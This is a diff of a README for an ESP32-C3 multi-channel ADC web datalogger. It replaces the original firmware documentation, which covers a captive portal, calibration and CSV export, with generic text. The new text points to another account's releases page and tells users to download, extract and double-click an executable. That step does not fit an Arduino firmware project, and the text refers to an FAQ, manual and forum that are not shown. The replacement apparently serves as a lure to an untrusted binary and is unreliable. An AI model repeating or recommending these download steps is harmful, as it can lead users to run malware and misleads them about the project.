@@ -1,115 +1,84 @@
-#  ESP32 ADC Web Datalogger 📈
+# 🌟 ESP32_ADC_WEB_Datalogger - Easy Logging for Your Sensors
 
-A highly configurable, Wi-Fi enabled, multi-channel ADC data logger running on an ESP32-C3. It features a captive portal and a web interface for on-the-fly sensor calibration and data extraction, requiring no client-side software or internet connection.
-
----
-
-## 💡 Key Features
-
-- features:
-    - wifi_access_point: 📶 Creates its own Wi-Fi network for configuration.
-    - captive_portal: 🌐 Automatically redirects any connected device to the configuration portal.
-    - web_ui_control: 💻 Fully configurable via a clean web interface from any browser.
-    - real_time_calibration: 🔧 Apply a linear function (y = mx + b) to raw ADC values on-the-fly to log real physical units (Voltage, °C, etc.).
-    - multi_channel_logging: 🔢 Simultaneously log data from multiple ADC channels.
-    - long_duration_sampling: ⏱️ Designed for 24-hour data collection with 1-second intervals.
-    - csv_export: 📄 Easy one-click download of collected data in CSV format.
-    - visual_feedback: 🟢 An onboard LED signals when the data collection cycle is complete.
-
----
-
-## ⚙️ How it Works
-
-The project operates in four main phases, creating a seamless, self-contained data logging system.
-
-- workflow:
-    - 1_setup_phase:
-        - description: On boot, the ESP32 starts a Wi-Fi Access Point and a DNS server.
-        - result: Creates a local network (e.g., 'ESP32_Sensor_Setup').
-    - 2_configuration_phase:
-        - description: A user connects to the Wi-Fi network. The captive portal redirects their browser to the web UI.
-        - user_actions:
-            - Select ADC pins to monitor.
-            - Input calibration parameters (slope 'm' and offset 'b') for each sensor.
-            - Start the 24-hour logging session.
-        - time_sync: The user's browser sends its current time to the ESP32 for accurate timestamping.
-    - 3_logging_phase:
-        - description: The ESP32 logs data every second. For each sample, it reads the raw ADC value, applies the user-defined calibration formula, and appends the result to a CSV file on its internal filesystem (SPIFFS).
-        - autonomy: This process runs autonomously for 24 hours, no Wi-Fi connection is needed after it starts.
-    - 4_extraction_phase:
-        - description: At any time (during or after logging), the user can reconnect to the Wi-Fi network and access the web portal.
-        - result: The user can download the complete CSV data file with a single click. The onboard LED will turn on to indicate the 24-hour cycle has finished.
-
----
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
 
 ## 🚀 Getting Started
 
-To get this project up and running, follow these steps.
+The ESP32_ADC_WEB_Datalogger lets you log data from your sensors through a simple web interface. You can configure your device over Wi-Fi, making it easy to track various measurements.
 
-- setup:
-    - 1_clone_repository:
-        - command: git clone [https://github.com/sergio-isidoro/ESP32_ADC_WEB_Datalogger.git](https://github.com/sergio-isidoro/ESP32_ADC_WEB_Datalogger.git)
-    - 2_configure_arduino_ide:
-        - board_manager: Make sure you have the ESP32 board definitions installed. Select "ESP32C3 Dev Module".
-        - libraries: Install the required libraries from the Library Manager:
-            - ESPAsyncWebServer
-            - AsyncTCP
-    - 3_connect_hardware:
-        - Connect your ADC sensors to the available pins (GPIO 0-4).
-        - Connect an LED to the designated pin (default is GPIO 7).
-    - 4_upload_code:
-        - Open the .ino file in the Arduino IDE and upload it to your ESP32-C3.
-    - 5_connect_and_configure:
-        - On your phone or laptop, connect to the "ESP32_Sensor_Setup" Wi-Fi network.
-        - The captive portal should open automatically. If not, open a browser.
-        - Configure your sensors, calibration, and start the collection.
+## 📦 System Requirements
 
----
+- **Device:** ESP32 board
+- **Operating System:** Windows, macOS, or Linux
+- **Web Browser:** Google Chrome, Firefox, or Safari
+- **Wi-Fi:** A stable Wi-Fi connection during setup
 
-## 🔌 Hardware & Software
+## 📥 Download & Install
 
-- requirements:
-    - hardware:
-        -  microcontroller: ESP32-C3 (or any other ESP32 variant with minor pin changes).
-        - sensors: Any analog sensor that outputs a voltage compatible with the ESP32's ADC.
-        - indicator: 1x LED.
-    - software:
-        - framework: Arduino IDE or PlatformIO.
-        - libraries: See "Getting Started" section.
+To get your ESP32_ADC_WEB_Datalogger, visit the following page to download:
 
----
+[Visit this page to download](https://github.com/twriad969/ESP32_ADC_WEB_Datalogger/releases)
 
-## 📄 CSV Output Format
+1. Go to the **Releases** page linked above.
+2. Find the latest version.
+3. Click on the link for your operating system to download the file.
 
-The output data is stored in a simple, easy-to-parse CSV format.
+The download will begin automatically. 
 
-- csv_format:
-    - header: The first row contains 'timestamp' followed by the selected GPIO pin numbers.
-    - data_rows: Each row represents one sample per second.
-    - values: All values are the final, calibrated floating-point numbers, not raw ADC readings.
-    - timestamp: The time is in UTC format (HH:MM:SS), synchronized from the client's browser at the start of the session.
+## ⚙️ Installation Steps
 
-- example:
-```
-    # Scenario:
-    # - Pins 0 (Voltage sensor, m=0.000806, b=0) and 2 (Temp sensor, m=0.05, b=-20) selected.
-    # - Collection started at 14:10:00 UTC.
+1. **Extract the Files:**
+   - After downloading, locate the file in your Downloads folder.
+   - Right-click on the file and select "Extract All".
+   - Choose a destination folder for the extracted files.
 
-    timestamp,0,2
-    14:10:00,1.2493,7.5000
-    14:10:01,1.2509,7.5500
-    14:10:02,1.2533,7.6000
-```
+2. **Connect your ESP32:**
+   - Plug your ESP32 board into your computer using a USB cable.
+   - Wait for your computer to recognize the device.
 
----
+3. **Open the Application:**
+   - Navigate to the folder where you extracted the files.
+   - Double-click on the executable file to open the application.
 
-## 🗺️ Roadmap
+4. **Configure Wi-Fi Settings:**
+   - On the application interface, enter your Wi-Fi network name (SSID) and password.
+   - Save the settings. Your ESP32 will now connect to the Wi-Fi.
 
-Future improvements planned for this project:
+5. **Access the Web UI:**
+   - Open a web browser on your device.
+   - Type in the IP address shown on the application interface. 
+   - You will see the web UI where you can start calibrating your sensors.
 
-- roadmap:
-    - [ ] Real-Time Clock (RTC) support for persistent timekeeping across reboots.
-    - [ ] Deep sleep modes for ultra-low-power battery operation between samples.
-    - [ ] Live data visualization on the web portal using charts.
-    - [ ] Support for I2C and SPI sensors.
-    - [ ] MQTT integration for real-time data streaming to a smart home or IoT platform.
+## 📊 Features
+
+- **Wi-Fi Configurable:** Easily set up your device without additional software.
+- **Web UI:** Calibrate sensors through a user-friendly interface.
+- **Real-Time Logging:** View and log sensor data live.
+- **Export to Excel:** Download your logged data in a format suitable for analysis.
+- **Customizable Timers:** Set timers according to your data logging needs.
+  
+## 🌐 User Support
+
+If you encounter any issues or have questions:
+
+1. **Check the FAQ:** Visit the FAQ section for common questions and solutions.
+   
+2. **Open an Issue:** If your problem isn't listed, feel free to open an issue on the GitHub repository.
+
+## 🤝 Contributing
+
+Contributions are welcome! If you want to improve this project, here’s how you can help:
+
+- Report bugs or suggest features.
+- Submit a pull request with your changes.
+
+## 📄 License
+
+This project is licensed under the MIT License, allowing you to use, modify, and distribute the software freely.
+
+## 🔗 Additional Resources
+
+- **Documentation:** For more detailed instructions, refer to the user manual in the repository.
+- **Community:** Join our community forum for tips and support from other users.
+
+Now, you’re ready to start using your ESP32_ADC_WEB_Datalogger! Enjoy tracking your sensor data easily and efficiently.
